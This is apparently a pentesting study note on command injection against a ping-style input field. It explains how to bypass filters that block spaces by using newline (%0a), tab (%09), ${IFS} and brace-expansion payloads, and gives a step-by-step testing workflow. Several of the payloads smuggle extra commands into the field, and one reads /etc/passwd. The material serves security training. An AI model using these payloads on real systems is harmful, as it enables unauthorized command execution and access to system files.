# Command Injection – Bypassing Space Filters

## Overview

Input filters often block characters commonly used in command injection payloads.

Frequently blocked characters:

- semicolon `;`
- pipe `|`
- ampersand `&`
- space `" "`

When spaces are blocked, payload construction becomes more challenging because most commands require spaces between:

- command
- flags
- arguments

Example normal command:

```bash
whoami
```

Example requiring spaces:

```bash
ls -la
```

Even when spaces are filtered, alternative separators can be used to achieve identical execution behaviour.

Understanding how shells interpret whitespace allows us to bypass filters effectively.

---

# 1. Using Newline as Injection Operator

Newline is often not filtered because it is commonly used in normal input formatting.

Newline encoding:

```
%0a
```

Example payload:

```
127.0.0.1%0awhoami
```

Executed command:

```bash
ping -c 1 127.0.0.1
whoami
```

Behaviour:

commands execute sequentially.

If application does not block newline characters, this provides a reliable injection method.

---

# 2. Identifying Space Filtering

Example payload:

```
127.0.0.1%0a whoami
```

Result:

```
Invalid input
```

Indicates:

space character blocked.

Space filtering is common when input expected to follow strict format (e.g. IP address).

We must replace spaces with alternative separators.

---

# 3. Using Tabs Instead of Spaces

Tabs behave similarly to spaces in command parsing.

Tab encoding:

```
%09
```

Example payload:

```
127.0.0.1%0a%09whoami
```

Executed command:

```bash
ping -c 1 127.0.0.1
    whoami
```

Shell interprets tab as whitespace.

Command executes successfully.

---

# 4. Using $IFS Environment Variable

IFS = Internal Field Separator.

Default value:

```
space
tab
newline
```

Using `${IFS}` inserts whitespace without explicitly using space character.

Example payload:

```
127.0.0.1%0a${IFS}whoami
```

Shell expands variable automatically.

Executed command:

```bash
whoami
```

Advantages:

- bypass space filters
- commonly allowed
- widely supported

---

# 5. Using Brace Expansion

Bash supports brace expansion to generate arguments.

Example:

```bash
{ls,-la}
```

Shell interprets as:

```bash
ls -la
```

No space required.

Example payload:

```
127.0.0.1%0a{ls,-la}
```

Useful when space character blocked.

---

# 6. Combining Bypass Techniques

Injection operators and space bypass techniques can be combined.

Example payload:

```
127.0.0.1%0a${IFS}id
```

Example payload:

```
127.0.0.1%0a{cat,/etc/passwd}
```

Example payload:

```
127.0.0.1%0a%09whoami
```

Each bypass uses different shell parsing behaviour.

---

# 7. Why Space Filters Are Weak

Filtering spaces does not prevent command execution.

Shell interprets multiple characters as separators:

- spaces
- tabs
- newlines
- variable expansion
- brace expansion

Blocking only literal spaces is insufficient.

Robust validation must sanitise command execution context.

---

# 8. Practical Payload Examples

## newline injection

```
127.0.0.1%0awhoami
```

## newline + tab

```
127.0.0.1%0a%09whoami
```

## newline + IFS variable

```
127.0.0.1%0a${IFS}whoami
```

## brace expansion

```
127.0.0.1%0a{ls,-la}
```

## reading files

```
127.0.0.1%0a{cat,/etc/passwd}
```

---

# 9. Testing Workflow

Step 1 – confirm newline allowed

```
127.0.0.1%0a
```

Step 2 – test command execution

```
127.0.0.1%0awhoami
```

Step 3 – identify blocked characters

```
127.0.0.1%0a whoami
```

Step 4 – replace spaces

```
%09
${IFS}
{}
```

Step 5 – confirm command execution

observe output changes.

---

# 10. Key Observations

- spaces commonly filtered
- newline often overlooked
- tab interpreted as whitespace
- ${IFS} expands into valid separator
- brace expansion avoids spaces entirely
- shell parsing behaviour creates bypass opportunities

Understanding shell parsing rules allows reliable bypass construction.

---

# 11. Key Takeaways

- filters often block literal spaces
- alternative whitespace characters bypass restrictions
- newline (%0a) effective injection operator
- tab (%09) functions as space
- ${IFS} expands to whitespace dynamically
- brace expansion removes need for spaces
- combining techniques increases reliability
- shell behaviour enables flexible payload construction

---

# Tags

#command-injection
#filter-bypass
#waf-bypass
#linux
#rce
#bash
#pentesting
#ctf
#obsidian